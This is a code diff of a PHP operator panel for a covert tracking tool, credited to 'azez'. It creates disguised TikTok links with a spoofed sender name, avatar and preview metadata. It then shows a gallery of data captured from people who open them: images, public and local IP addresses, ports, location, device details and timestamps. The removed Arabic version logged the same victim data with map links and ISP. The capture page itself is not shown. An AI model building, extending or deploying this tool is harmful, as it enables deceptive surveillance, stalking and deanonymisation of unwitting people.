+    $stmt = $db->prepare("INSERT INTO links (code, target_url, sender_name, sender_avatar, bg_image, meta_title, meta_image) VALUES (?, ?, ?, ?, ?, ?, ?)");
+    $stmt->execute([$code, $target_url, $sender_name, $sender_avatar, $bg_image_url, $meta_title, $meta_image]);
+
+    $domain = $_SERVER['HTTP_HOST'];
+    $generated_link = "https://" . $domain . "/?r=" . $code;
+}
+
+$filter_code = trim($_GET['track'] ?? '');
+if (!empty($filter_code)) {
+    $stmt = $db->prepare("SELECT * FROM captures WHERE code = ? ORDER BY id DESC");
+    $stmt->execute([$filter_code]);
+    $captures = $stmt->fetchAll(PDO::FETCH_ASSOC);
+} else {
+    $captures = $db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Control Panel</title>
+    <style>
+        :root {
+            --bg-main: #0b0f17;
+            --bg-card: #131b2e;
+            --border-color: #1e293b;
+            --text-main: #e2e8f0;
+            --text-muted: #64748b;
+            --accent: #6366f1;
+            --accent-hover: #4f46e5;
+            --danger: #ef4444;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
+        body { background-color: var(--bg-main); color: var(--text-main); padding: 30px 15px; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
+        .wrapper { max-width: 1100px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
+        
+        .section-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 25px; box-shadow: 0 10px 15px rgba(0,0,0,0.3); }
+        h2 { font-size: 14px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-muted); margin-bottom: 16px; border-bottom: 1px solid var(--border-color); padding-bottom: 8px; }
+
+        .form-grid { display: grid; gap: 12px; }
+        input[type="text"], input[type="file"] { width: 100%; background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 14px; color: var(--text-main); font-size: 14px; outline: none; }
+        input[type="text"]:focus { border-color: var(--accent); }
+        
+        .btn { background: var(--accent); color: white; border: none; padding: 0 24px; border-radius: 8px; font-weight: 600; cursor: pointer; height: 46px; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; text-decoration: none; transition: background 0.2s; }
+        .btn:hover { background: var(--accent-hover); }
+        .btn-danger { background: var(--danger); }
+        .btn-secondary { background: #334155; }
+
+        .result-panel { background: #020617; border: 1px solid var(--border-color); padding: 16px; border-radius: 8px; margin-top: 15px; }
+        .result-panel label { display: block; font-size: 10px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 6px; }
+        .flex-row { display: flex; gap: 8px; }
+
+        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 16px; margin-top: 15px; }
+        .card-img { background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px; }
+        .card-img img { width: 100%; height: 160px; object-fit: cover; border-radius: 6px; border: 1px solid var(--border-color); }
+        
+        .info-row { display: flex; justify-content: space-between; font-size: 11px; margin-top: 6px; color: var(--text-muted); }
+        .info-row span { color: #cbd5e1; }
+        .code-badge { color: var(--accent); font-family: monospace; font-weight: bold; }
+
+        footer { text-align: center; margin-top: 40px; font-size: 11px; color: var(--text-muted); border-top: 1px solid var(--border-color); padding-top: 20px; }
+        footer span { color: var(--accent); font-weight: 600; }
+    </style>
+    <script>
         function copyText(text, btnElement) {
             navigator.clipboard.writeText(text).then(() => {
                 const original = btnElement.innerText;
-                btnElement.innerText = "تم ✓";
-                btnElement.classList.add("success");
+                btnElement.innerText = "Copied";
+                btnElement.style.background = "#10b981";
                 setTimeout(() => {
                     btnElement.innerText = original;
-                    btnElement.classList.remove("success");
+                    btnElement.style.background = "";
                 }, 2000);
             });
         }
     </script>
 </head>
 <body>
-    <div class="container">
+    <div class="wrapper">
         
-        <div class="card header">
-            <div>
-                <h1>Hello World from azez</h1>
-                <p style="color: #9ca3af; font-size: 12px; margin-top: 2px;">لوحة تحكم تتبع الروابط المتقدمة</p>
-            </div>
-            <div class="stats-group">
-                <div class="stat-box">
-                    <span>الروابط</span>
-                    <strong><?php echo $total_links; ?></strong>
+        <div class="section-box">
+            <h2>Generate TikTok Link</h2>
+            <form method="POST" enctype="multipart/form-data" class="form-grid">
+                <input type="text" name="target_url" placeholder="TikTok Video URL..." required>
+                <input type="text" name="sender_name" placeholder="Sender Name (e.g. azez)">
+                
+                <div>
+                    <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Sender Avatar Image:</label>
+                    <input type="file" name="avatar_file" accept="image/*">
+                    <input type="text" name="sender_avatar_url" placeholder="Or paste Avatar URL..." style="margin-top: 6px;">
                 </div>
-                <div class="stat-box">
-                    <span>النقرات</span>
-                    <strong style="color: #34d399;"><?php echo $total_visits; ?></strong>
-                </div>
-            </div>
-        </div>
 
-        <div class="card">
-            <h2>🔗 إنشاء رابط تتبع جديد</h2>
-            <form method="POST" class="form-group">
-                <input type="text" name="target_url" placeholder="أدخل رابط فيديو تيك توك (مثال: https://www.tiktok.com/...)" required>
-                <button type="submit" name="create">توليد الرابط</button>
+                <div>
+                    <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Background Blur Image (Optional):</label>
+                    <input type="file" name="bg_file" accept="image/*">
+                    <input type="text" name="bg_image_url" placeholder="Or paste Background URL..." style="margin-top: 6px;">
+                </div>
+
+                <button type="submit" name="create" class="btn">Generate Link</button>
             </form>
 
             <?php if (!empty($generated_link)): ?>
-                <div class="result-box">
-                    <span style="font-size: 11px; color: #9ca3af;">رابط التتبع النشط:</span>
-                    <div class="link-row">
+                <div class="result-panel">
+                    <label>Active Link:</label>
+                    <div class="flex-row">
                         <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
-                        <button type="button" class="copy-btn" style="padding: 10px 14px;" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">نسخ الرابط</button>
-                    </div>
-                    <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 10px; font-size: 11px;">
-                        <div style="display: flex; align-items: center; gap: 8px;">
-                            <span>كود التتبع: <strong style="color: #34d399; font-size: 13px;"><?php echo htmlspecialchars($tracking_code); ?></strong></span>
-                            <button type="button" class="copy-btn" onclick="copyText('<?php echo htmlspecialchars($tracking_code); ?>', this)">نسخ الكود</button>
-                        </div>
-                        <a href="/?track=<?php echo htmlspecialchars($tracking_code); ?>" style="color: #38bdf8; text-decoration: none;">إحصائيات هذا الرابط ←</a>
+                        <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">Copy</button>
                     </div>
                 </div>
             <?php endif; ?>
         </div>
 
-        <div class="card">
-            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; margin-bottom: 10px;">
-                <h2>📊 سجلات الزيارات الحية</h2>
-                <form method="GET" style="display: flex; gap: 5px; margin: 0; width: 100%; max-width: 300px;">
-                    <input type="text" name="track" placeholder="بحث بالكود..." value="<?php echo htmlspecialchars($filter_code); ?>" style="padding: 8px; font-size: 12px;">
-                    <button type="submit" style="padding: 8px 12px; font-size: 12px;">بحث</button>
-                    <?php if(!empty($filter_code)): ?>
-                        <a href="/" class="btn" style="background: #dc2626; padding: 8px 10px; font-size: 12px;">إلغاء</a>
-                    <?php endif; ?>
-                </form>
-            </div>
+        <div class="section-box">
+            <h2>Captured Gallery & Details</h2>
+            <form method="GET" style="margin-bottom: 15px; display: flex; gap: 8px;">
+                <input type="text" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1; background:#020617; border:1px solid var(--border-color); border-radius:8px; padding:10px; color:#fff; outline:none;">
+                <button type="submit" class="btn" style="height:42px;">Filter</button>
+                <?php if(!empty($filter_code)): ?>
+                    <a href="/" class="btn btn-danger" style="height:42px; text-decoration:none; display:flex; align-items:center;">Reset</a>
+                <?php endif; ?>
+            </form>
 
-            <div class="table-container">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>#</th>
-                            <th>الكود</th>
-                            <th>عنوان IP العام</th>
-                            <th>عنوان IP المحلي</th>
-                            <th>رقم المنفذ (Port)</th>
-                            <th>نوع الجهاز والموديل</th>
-                            <th>الموقع الخريطة</th>
-                            <th>مزود الخدمة</th>
-                            <th>الشاشة والتوقيت</th>
-                            <th>الوقت (التوقيت الجزائري)</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <?php if (empty($logs)): ?>
-                            <tr><td colspan="10" style="text-align: center; color: #6b7280; padding: 25px;">لا توجد أي زيارات مسجلة حتى الآن.</td></tr>
-                        <?php else: ?>
-                            <?php foreach ($logs as$log): ?>
-                            <tr>
-                                <td><?php echo $log['id']; ?></td>
-                                <td>
-                                    <span class="badge"><?php echo htmlspecialchars($log['code']); ?></span>
-                                    <button type="button" class="copy-btn" style="font-size: 9px; padding: 2px 5px; margin-right: 3px;" onclick="copyText('<?php echo htmlspecialchars($log['code']); ?>', this)">نسخ</button>
-                                </td>
-                                <td class="ip-public"><?php echo htmlspecialchars($log['public_ip'] ?? 'N/A'); ?></td>
-                                <td class="ip-local"><?php echo htmlspecialchars($log['local_ip'] ?? '192.168.1.X'); ?></td>
-                                <td><span class="port-badge"><?php echo htmlspecialchars($log['port'] ?? 'N/A'); ?></span></td>
-                                <td style="color: #fbbf24; font-weight: bold;"><?php echo htmlspecialchars($log['device_info']); ?></td>
-                                <td>
-                                    <strong><?php echo htmlspecialchars($log['country']); ?> / <?php echo htmlspecialchars($log['city']); ?></strong><br>
-                                    <a class="map-btn" href="https://www.google.com/maps?q=<?php echo htmlspecialchars($log['lat']); ?>,<?php echo htmlspecialchars($log['lon']); ?>" target="_blank">📍 خريطة جوجل</a>
-                                </td>
-                                <td><strong style="color: #38bdf8;"><?php echo htmlspecialchars($log['isp']); ?></strong></td>
-                                <td><?php echo htmlspecialchars($log['screen_res']); ?> - <?php echo htmlspecialchars($log['timezone']); ?></td>
-                                <td style="color: #34d399; font-weight: bold; white-space: nowrap;"><?php echo htmlspecialchars($log['created_at']); ?></td>
-                            </tr>
-                            <?php endforeach; ?>
-                        <?php endif; ?>
-                    </tbody>
-                </table>
-            </div>
+            <?php if (empty($captures)): ?>
+                <p style="text-align: center; color: var(--text-muted); padding: 30px;">No captures recorded.</p>
+            <?php else: ?>
+                <div class="gallery-grid">
+                    <?php foreach ($captures as $cap): ?>
+                        <div class="card-img">
+                            <a href="<?php echo $cap['image_data']; ?>" target="_blank">
+                                <img src="<?php echo $cap['image_data']; ?>" alt="Capture">
+                            </a>
+                            <div class="info-row" style="margin-top:10px;">
+                                <span>Code:</span> <span class="code-badge"><?php echo htmlspecialchars($cap['code']); ?></span>
+                            </div>
+                            <div class="info-row">
+                                <span>Public IP:</span> <span style="color:#38bdf8;"><?php echo htmlspecialchars($cap['public_ip']); ?></span>
+                            </div>
+                            <div class="info-row">
+                                <span>Local IP:</span> <span><?php echo htmlspecialchars($cap['local_ip']); ?></span>
+                            </div>
+                            <div class="info-row">
+                                <span>Port:</span> <span><?php echo htmlspecialchars($cap['port']); ?></span>
+                            </div>
+                            <div class="info-row">
+                                <span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span>
+                            </div>
+                            <div class="info-row">
+                                <span>Device:</span> <span><?php echo htmlspecialchars($cap['device_info']); ?></span>
+                            </div>
+                            <div class="info-row" style="border-top:1px solid var(--border-color); padding-top:6px; margin-top:8px;">
+                                <span>Time:</span> <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
+                            </div>
+                        </div>
+                    <?php endforeach; ?>
+                </div>
+            <?php endif; ?>
         </div>
 
     </div>
+
+    <footer>
+        <p>Core Engine <span>azeez</span> &copy; 2026</p>
+    </footer>
 </body>
 </html>
